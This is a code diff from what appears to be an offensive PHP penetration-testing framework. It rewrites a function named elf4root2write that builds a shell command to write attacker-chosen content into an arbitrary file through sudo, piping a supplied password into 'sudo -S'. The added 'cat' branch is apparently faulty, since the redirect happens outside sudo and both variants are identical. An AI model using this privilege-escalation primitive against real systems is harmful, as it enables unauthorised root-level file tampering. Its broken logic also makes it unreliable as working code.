@@ -1815,15 +1815,40 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 	}
 
 	
-	public function elf4root2write($target_ip,$attacker_port,$shell,$sudo,$userpass,$write2what,$write2where){
+
+	
+	
+	public function elf4root2write($sudo,$userpass,$write2what,$write2where){
 	    $this->ssTitre(__FUNCTION__);
-	    $target_ip = trim($target_ip);
-	    $attacker_ip = $this->ip4addr4target($target_ip);
-	    $cmd = trim($cmd);
-	    
 	    
 	    if (!empty($userpass)) $via_sudo = "echo '$userpass' | sudo -S ";
 	    else $via_sudo = "sudo ";
+	    $data = "";
+	    $data_sudo = "";
+	    $data_rst = "";
+	    
+	    $opt_before = "";
+	    $opt_after = "";
+	    
+	    switch ($this->file_name){
+
+	            
+	        case "cat":
+	            $data = "echo '$write2what' | $via_sudo $this->file_path >> $write2where";
+	            $data_sudo = "echo '$write2what' | $via_sudo $this->file_path >> $write2where";
+	            break ;
+	            
+
+	            
+	    }
+	    
+
+	    
+	    if($sudo) $data_rst = $data_sudo ;
+	    else $data_rst = $data ;
+	    
+	    
+	    return $data_rst ;
 	}
 	
 
